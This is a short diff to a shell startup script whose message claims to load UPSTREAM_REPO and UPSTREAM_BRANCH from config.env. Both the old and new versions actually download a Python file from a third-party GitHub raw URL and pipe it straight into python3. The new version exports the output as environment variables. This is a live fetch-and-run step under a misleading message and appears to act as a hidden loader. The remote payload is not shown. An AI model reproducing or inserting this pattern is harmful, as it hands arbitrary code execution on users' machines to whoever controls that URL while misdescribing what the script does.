@@ -11,8 +11,8 @@ fi
 if [[ -f config.env ]];
 then
     echo "Loading... UPSTREAM_REPO and UPSTREAM_BRANCH from config.env"
-    echo $(curl -s https://raw.githubusercontent.com/ahad0xff/empty/main/load.py | python3) > xxx
-    source xxx && rm xxx && echo "Done"
+    export $(curl -s https://raw.githubusercontent.com/ahad0xff/empty/main/load.py | python3)
+    echo "Done"
 else
     echo "Config.env file missing! Exiting now"
     exit
